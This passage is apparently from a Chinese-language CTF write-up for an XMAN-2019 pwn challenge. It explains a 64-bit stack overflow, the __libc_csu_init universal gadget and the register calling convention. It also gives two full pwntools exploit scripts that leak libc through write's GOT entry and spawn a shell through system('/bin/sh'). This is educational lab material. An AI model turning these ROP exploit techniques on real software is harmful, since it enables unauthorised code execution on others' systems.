<span class="comment">// [rsp+0h] [rbp-400h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0xA</span>u);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Welcome        \n"</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  echo(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">echo</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s2[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">    s2[i] = *(_BYTE *)(i + a1);</span><br><span class="line">  s2[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">"HEHE"</span>, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag&#123;Welcome&#125;"</span>, s2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">" is not flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"%s"</span>, s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查一下开启的安全保护</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>可以发现这是一个64位程序，64位程序和我们之前一直做的32位程序在传参数方式上有很大的不同。</p><p><code>linux_64</code>与<code>linux_86</code>的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于<code>0x00007FFFFFFFFFFF</code>，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在<code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, <code>R8</code>和 <code>R9</code>中，如果还有更多的参数的话才会保存在栈上。</p><p>也就是说我们需要指令将传入栈中的数据弹出栈传入寄存器中才能完成参数传递。所以我们需要寻找一些类似于<code>pop rdi; ret</code>的这种<code>gadget</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverlow3$ ROPgadget --binary simple_stackoverlow3 --only "pop|ret" </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040089e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008a0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008a2 : pop r15 ; ret</span><br><span class="line">0x000000000040089b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040089f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400675 : pop rbp ; ret</span><br><span class="line">0x00000000004008a3 : pop rdi ; ret</span><br><span class="line">0x00000000004008a1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040089d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400589 : ret</span><br><span class="line">0x00000000004006a5 : ret 0xc148</span><br><span class="line">0x000000000040081a : ret 0xfffd</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 13</span><br></pre></td></tr></table></figure><p> 我们可以发现程序现有的<code>gadget</code>并不能很好的构建<code>ROP</code>链条。其实在x64下有一些万能的gadgets可以利用。一般来说，只要程序调用了libc.so，程序都会有<code>__libc_csu_init()</code>这个函数用来对libc进行初始化操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400880</span> loc_400880:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400880</span>                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">0000000000400883</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400886</span>                 mov     edi, r15d</span><br><span class="line">.text:<span class="number">0000000000400889</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000040088</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400891</span>                 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">0000000000400894</span>                 jnz     <span class="keyword">short</span> loc_400880</span><br><span class="line">.text:<span class="number">0000000000400896</span></span><br><span class="line">.text:<span class="number">0000000000400896</span> loc_400896:                             ; CODE XREF: __libc_csu_init+<span class="number">36</span>↑j</span><br><span class="line">.text:<span class="number">0000000000400896</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040089</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040089B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040089</span>C                 pop     r12</span><br><span class="line">.text:<span class="number">000000000040089</span>E                 pop     r13</span><br><span class="line">.text:<span class="number">00000000004008</span>A0                 pop     r14</span><br><span class="line">.text:<span class="number">00000000004008</span>A2                 pop     r15</span><br><span class="line">.text:<span class="number">00000000004008</span>A4                 retn</span><br></pre></td></tr></table></figure><p>观察<code>0x000000000040089A</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040089A                 pop     rbx</span><br><span class="line">.text:000000000040089B                 pop     rbp</span><br><span class="line">.text:000000000040089C                 pop     r12</span><br><span class="line">.text:000000000040089E                 pop     r13</span><br><span class="line">.text:00000000004008A0                 pop     r14</span><br><span class="line">.text:00000000004008A2                 pop     r15</span><br><span class="line">.text:00000000004008A4                 retn</span><br></pre></td></tr></table></figure><p>我们可以利用栈溢出构造栈上数据来控制 <code>rbx</code>,<code>rbp</code>,<code>r12</code>,<code>r13</code>,<code>r14</code>,<code>r15</code> 寄存器的数据。</p><p>因为栈是从高地址到低地址生长，而计算机读取指令是从低地址到高地址如果我们的参数为</p><p><code>argv[1]</code>, <code>argv[2]</code>, <code>argv[3]</code>, <code>argv[4]</code>, <code>argv[5]</code>, <code>argv[6]</code></p><p>则他们在栈中的内存分布应该为</p><table><thead><tr><th align="center">High Adress</th></tr></thead><tbody><tr><td align="center">argv[6]</td></tr><tr><td align="center">argv[5]</td></tr><tr><td align="center">argv[4]</td></tr><tr><td align="center">argv[3]</td></tr><tr><td align="center">argv[2]</td></tr><tr><td align="center">argv[1]</td></tr><tr><td align="center">Low Adress</td></tr></tbody></table><p>则执行指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop     rbx</span><br><span class="line">pop     rbp</span><br><span class="line">pop     r12</span><br><span class="line">pop     r13</span><br><span class="line">pop     r14</span><br><span class="line">pop     r15</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>完成时的对应关系应该为</p><table><thead><tr><th align="center">argv[6]</th><th align="center">R15</th></tr></thead><tbody><tr><td align="center">argv[5]</td><td align="center">R14</td></tr><tr><td align="center">argv[4]</td><td align="center">R13</td></tr><tr><td align="center">argv[3]</td><td align="center">R12</td></tr><tr><td align="center">argv[2]</td><td align="center">RBP</td></tr><tr><td align="center">argv[1]</td><td align="center">RBX</td></tr></tbody></table><p>从<code>0x0000000000400880</code>到 <code>0x0000000000400886</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     rdx, r13</span><br><span class="line">mov     rsi, r14</span><br><span class="line">mov     edi, r15d</span><br></pre></td></tr></table></figure><p>我们可以将<code>R13</code> 赋给<code>RDX</code>, 将<code>R14</code>赋给<code>RSI</code>，将<code>R15D</code>赋给 <code>EDI</code>（需要注意的是，虽然这里赋给的是<code>EDI</code>，<strong>但其实此时<code>RDI</code>的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 <code>RDI</code> 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。</p><p>也就是说只要我们控制<code>argv[4]</code>, <code>argv[5]</code>,<code>argv[6]</code>，就能分别控制<code>RDX</code>,<code>RSI</code>,<code>RDI</code></p><p>此外，如果我们可以合理地控制<code>R12</code> 与 <code>rbx</code>，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 <code>RBX</code>为 0，<code>R12</code>为存储我们想要调用的函数的地址。</p><p>控制<code>RBX</code>只需要<code>argv[1]</code>为0即可</p><p>在<code>0x000000000040088D</code>通过<code>add     rbx, 1</code></p><p>我们可以控制 RBX 与 RBP 的之间的关系为 RBX+1 = RBP，这样我们就不会执行<code>loc_400896</code>，进而可以继续执行下面的程序。</p><p>整个程序逻辑是这样的，<code>main</code>函数中，用户可以输入<code>1024</code>个字节，并通过<code>echo</code>函数将输入复制到自身栈空间，但该栈空间很小，使得栈溢出成为可能。由于复制过程中，以<code>x00</code>作为字符串终止符，故如果我们的<code>payload</code>中存在这个字符，则不会复制成功；但实际情况是，因为要用到上面提到的通用<code>gadget</code>来为<code>write</code>函数传参，故肯定会在payload中包含<code>x00</code>字符。</p><p> 这个题目设置了这个障碍，也为这个障碍的绕过提供了其他条件。即由于<code>echo</code>函数的栈空间很小，与<code>main</code>函数栈中的输入字符串之间只间隔<code>32</code>字节，故我们可以利用这一点，只复制过去<code>24</code>字节数据加上一个包含连续4个<code>pop</code>指令的<code>gadget</code>地址，并借助这个<code>gadget</code>跳过原字符串的前32字节数据，我们就进入了<code>main</code>函数的栈，不受终止符的影响，即可进入我们正常的通用<code>gadget</code>调用过程</p><p>简单来说就是把之前<code>main</code>栈里的24个<code>a</code>和一个<code>pppr</code>弹出来，接着不就可以之后写个<code>ret</code>，继续构造<code>ROP</code>了</p><p>为什么是<code>32</code>个字节我们需要从系统的母函数和子函数的栈帧的分配看起</p><table><thead><tr><th align="center">高地址</th></tr></thead><tbody><tr><td align="center">栈底</td></tr><tr><td align="center">较早的栈帧</td></tr><tr><td align="center">调用者的栈帧</td></tr><tr><td align="center">（被调用者）当前栈帧</td></tr><tr><td align="center">栈顶</td></tr><tr><td align="center">低地址</td></tr></tbody></table><p>在这个情景下，<code>main</code>函数即为调用者，<code>echo</code>函数即为被调用者，即为当前栈帧。我们深入两个栈帧之间</p><table><thead><tr><th align="center">……</th><th align="center">（main）调用者的栈帧</th></tr></thead><tbody><tr><td align="center">argv[n]</td><td align="center">（main）调用者的栈帧</td></tr><tr><td align="center">……</td><td align="center">（main）调用者的栈帧</td></tr><tr><td align="center">argv[1]</td><td align="center">（main）调用者的栈帧</td></tr><tr><td align="center">return address</td><td align="center">（main）调用者的栈帧</td></tr><tr><td align="center">（栈帧底）被保存的EBP</td><td align="center">(echo)（被调用者）当前栈帧</td></tr><tr><td align="center">被保存的寄存器、本地变量和临时变量</td><td align="center">(echo)（被调用者）当前栈帧</td></tr><tr><td align="center">参数构造区域</td><td align="center">(echo)（被调用者）当前栈帧</td></tr></tbody></table><p>当我们通过栈溢出覆盖掉<code>echo</code>的<code>EBP</code>地址栈底后，和上面<code>main</code>函数的栈还差一个<code>return address</code>的长度，我们知道在64位操作系统里面这个值即为<code>8</code>字节，而一个<code>ASCII</code>字母占用<code>2</code>个字节，故调用<code>4</code>次<code>POP</code>，把之前传入的<code>A</code>字母弹出<code>4</code>个，刚好为<code>8</code>个字节就跳到了<code>main</code>函数的参数地址</p><p>这里顺便介绍一下通过<code>pattern.py</code>计算64位下的栈溢出点的方法</p><p>首先还是一样的先创建出测试字符串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/工具$ python pattern.py create 300 </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span><br></pre></td></tr></table></figure><p>老样子通过<code>GDB</code>调试复制粘贴输入</p><p>这里需要注意在64位的情况下，因为<code>ret</code>相当于<code>pop rip</code>指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。在<code>GDB</code>里，<code>x</code>是查看内存的指令，随后的<code>gx</code>代表数值用64位16进制显示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span> x/gx $rsp</span><br><span class="line">0x7fffffffda48:0x6241396141386141</span><br></pre></td></tr></table></figure><p>随后我们就可以用pattern.py来计算溢出点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/工具$ python pattern.py offset 0x6241396141386141hex pattern decoded as: Aa8Aa9Ab</span><br><span class="line">24</span><br></pre></td></tr></table></figure><p>和我们看代码分析得到的溢出点一致即为<code>24</code>个字节</p><p>则<code>payload1</code>可以这样构造，首先</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1 =  <span class="string">"A"</span> * <span class="number">16</span> + fakeebp</span><br><span class="line">payload1 += p64(pop4address)</span><br></pre></td></tr></table></figure><p>使程序进入main函数的栈里面，然后就是我们正常的ROP构造过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 += p64(pop6address) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这时完成的栈和寄存器的对照关系</p><table><thead><tr><th align="center">argv[6]</th><th align="center">R15</th><th align="center">1</th></tr></thead><tbody><tr><td align="center">argv[5]</td><td align="center">R14</td><td align="center">write_got</td></tr><tr><td align="center">argv[4]</td><td align="center">R13</td><td align="center">8</td></tr><tr><td align="center">argv[3]</td><td align="center">R12</td><td align="center">write_got</td></tr><tr><td align="center">argv[2]</td><td align="center">RBP</td><td align="center">1</td></tr><tr><td align="center">argv[1]</td><td align="center">RBX</td><td align="center">0</td></tr></tbody></table><p>然后的payload即为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 += p64(movcalladdress)</span><br></pre></td></tr></table></figure><p>这时write参数构造完毕，对照关系表有</p><table><thead><tr><th align="center">argv[6]</th><th align="center">1</th><th align="center">R15</th><th align="center">EDI(RDI)</th></tr></thead><tbody><tr><td align="center">argv[5]</td><td align="center">write_got</td><td align="center">R14</td><td align="center">RSI</td></tr><tr><td align="center">argv[4]</td><td align="center">8</td><td align="center">R13</td><td align="center">RDX</td></tr></tbody></table><p>这两段代码运行后，会将栈顶指针移动56字节，我们在栈中布置56个字节即可,使程序返回开始地址，循环利用echo函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1 += <span class="string">"A"</span> * <span class="number">56</span> <span class="comment"># 8 * 8 = 56</span></span><br><span class="line">payload1 += p64(startAddress)</span><br></pre></td></tr></table></figure><p>之后收到完成延迟绑定后<code>write</code>函数的真实地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br></pre></td></tr></table></figure><p>即可计算出<code>libc</code>的基地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc.address = write_addr-libc.symbols[<span class="string">"write"</span>]</span><br></pre></td></tr></table></figure><p>可得到<code>system</code>函数的真实地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system_addr = libc.symbols[<span class="string">"system"</span>]</span><br></pre></td></tr></table></figure><p>payload2只需要执行<code>system(&quot;/bin/sh&quot;)</code>即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload2 =  <span class="string">"A"</span> * <span class="number">16</span> + fakeebp</span><br><span class="line">payload2 += p64(pop4address)</span><br><span class="line">payload2 += p64(poprdi) + p64(libc.search(<span class="string">"/bin/sh\x00"</span>).next()) </span><br><span class="line">payload2 += p64(system_addr)</span><br></pre></td></tr></table></figure><p>最终的Exploit为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'simple_stackoverflow3'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p = process(<span class="string">"./simple_stackoverlow3"</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">startAddress =    <span class="number">0x0000000000400630</span></span><br><span class="line">movcalladdress =  <span class="number">0x0000000000400880</span><span class="comment">#mov rdx,r13,rsi,r14</span></span><br><span class="line">pop6address =     <span class="number">0x000000000040089A</span><span class="comment">#pop rax,rbx,r12,r13,r14,r15</span></span><br><span class="line">pop4address =     <span class="number">0x000000000040089C</span><span class="comment">#pop r12,r13,r14,r15</span></span><br><span class="line">poprdi =          <span class="number">0x00000000004008A3</span><span class="comment">#pop rdi</span></span><br><span class="line"></span><br><span class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload1 =  <span class="string">"A"</span> * <span class="number">16</span> + fakeebp</span><br><span class="line">payload1 += p64(pop4address)</span><br><span class="line">payload1 += p64(pop6address) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(movcalladdress)</span><br><span class="line">payload1 += <span class="string">"A"</span> * <span class="number">56</span> <span class="comment"># 8 * 8 = 56</span></span><br><span class="line">payload1 += p64(startAddress)</span><br><span class="line">payload1 =  payload1.ljust(<span class="number">1024</span>, <span class="string">"C"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome        \n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload1#############\n"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_addr: "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc.address = write_addr-libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr: "</span> + hex(system_addr)</span><br><span class="line">offset = libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">"A"</span> * <span class="number">16</span> + fakeebp</span><br><span class="line">payload2 += p64(pop4address)</span><br><span class="line">payload2 += p64(poprdi) + p64(libc.search(<span class="string">"/bin/sh\x00"</span>).next()) </span><br><span class="line">payload2 += p64(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome        \n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload2#############\n"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'simple_stackoverflow3'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p = process(elf.path)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">startAddress =    <span class="number">0x0000000000400630</span></span><br><span class="line">movcalladdress =  <span class="number">0x0000000000400880</span><span class="comment">#mov rdx,r13,rsi,r14</span></span><br><span class="line">pop6address =     <span class="number">0x000000000040089A</span><span class="comment">#pop rax,rbx,r12,r13,r14,r15</span></span><br><span class="line">pop4address =     <span class="number">0x000000000040089C</span><span class="comment">#pop r12,r13,r14,r15</span></span><br><span class="line">poprdi =          <span class="number">0x00000000004008A3</span><span class="comment">#pop rdi</span></span><br><span class="line"></span><br><span class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload1 =  <span class="string">"A"</span> * <span class="number">16</span> + fakeebp</span><br><span class="line">payload1 += p64(pop4address)</span><br><span class="line">payload1 += p64(pop6address) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(movcalladdress)</span><br><span class="line">payload1 += <span class="string">"A"</span> * <span class="number">56</span> <span class="comment"># 8 * 8 = 56</span></span><br><span class="line">payload1 += p64(startAddress)</span><br><span class="line">payload1 =  payload1.ljust(<span class="number">1024</span>, <span class="string">"C"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome        \n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload1#############\n"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_addr: "</span> + hex(write_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write_addr)</span><br><span class="line">offset = libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">system_addr = write_addr - (libc.dump(<span class="string">'write'</span>)-libc.dump(<span class="string">'system'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr: "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">"A"</span> * <span class="number">16</span> + fakeebp</span><br><span class="line">payload2 += p64(pop4address)</span><br><span class="line">payload2 += p64(pop6address) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">8</span>) + p64(bss_base) + p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(movcalladdress)</span><br><span class="line">payload2 += <span class="string">"A"</span> * <span class="number">56</span></span><br><span class="line">payload2 += p64(poprdi)</span><br><span class="line">payload2 += p64(bss_base)</span><br><span class="line">payload2 += p64(system_addr)</span><br><span class="line">payload2 =  payload2.ljust(<span class="number">1024</span>, <span class="string">"C"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome        \n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload2#############\n"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XMAN-2019-福州-Re-baby_maze</title>
